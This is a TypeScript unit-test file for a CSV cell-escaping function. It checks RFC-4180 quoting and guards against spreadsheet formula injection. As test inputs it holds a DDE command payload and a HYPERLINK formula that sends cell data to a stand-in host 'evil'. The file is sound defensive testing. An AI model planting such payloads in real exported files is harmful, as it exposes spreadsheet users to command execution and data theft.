import assert from "node:assert/strict";
import { escapeCsvCell } from "./escape";

let pass = 0;
function t(name: string, fn: () => void) {
  fn();
  pass++;
  console.log(`  ✓ ${name}`);
}

console.log("lib/csv/escape — escapeCsvCell");

// ── RFC-4180 quoting ──────────────────────────────────────────────────────
t("wraps a plain value in double-quotes", () => {
  assert.equal(escapeCsvCell("hello"), '"hello"');
});

t("doubles embedded double-quotes", () => {
  assert.equal(escapeCsvCell('he said "hi"'), '"he said ""hi"""');
});

t("preserves embedded commas/newlines inside the quotes", () => {
  assert.equal(escapeCsvCell("a,b"), '"a,b"');
  assert.equal(escapeCsvCell("line1\nline2"), '"line1\nline2"');
});

t("renders null/undefined/empty as an empty quoted cell", () => {
  assert.equal(escapeCsvCell(null), '""');
  assert.equal(escapeCsvCell(undefined), '""');
  assert.equal(escapeCsvCell(""), '""');
});

t("stringifies numbers without a guard", () => {
  assert.equal(escapeCsvCell(1234.5), '"1234.5"');
  assert.equal(escapeCsvCell(0), '"0"');
});

// ── Formula-injection neutralization (the security fix) ───────────────────
t("guards a leading = (formula)", () => {
  assert.equal(escapeCsvCell("=1+1"), `"'=1+1"`);
});

t("guards a =cmd / DDE payload", () => {
  assert.equal(escapeCsvCell("=cmd|'/c calc'!A1"), `"'=cmd|'/c calc'!A1"`);
});

t("guards =HYPERLINK exfiltration payload (quotes still doubled)", () => {
  assert.equal(
    escapeCsvCell('=HYPERLINK("http://evil/?"&A1,"x")'),
    `"'=HYPERLINK(""http://evil/?""&A1,""x"")"`,
  );
});

t("guards leading + - @", () => {
  assert.equal(escapeCsvCell("+1"), `"'+1"`);
  assert.equal(escapeCsvCell("-1+1"), `"'-1+1"`);
  assert.equal(escapeCsvCell("@SUM(A1)"), `"'@SUM(A1)"`);
});

t("guards leading TAB and CR (Excel formula triggers)", () => {
  assert.equal(escapeCsvCell("\t=1"), `"'\t=1"`);
  assert.equal(escapeCsvCell("\r=1"), `"'\r=1"`);
});

t("does NOT guard a value with = in the middle", () => {
  assert.equal(escapeCsvCell("a=b"), '"a=b"');
});

t("does NOT guard ordinary Thai customer names", () => {
  assert.equal(escapeCsvCell("คุณสมชาย ใจดี"), '"คุณสมชาย ใจดี"');
});

console.log(`\n${pass} passed`);
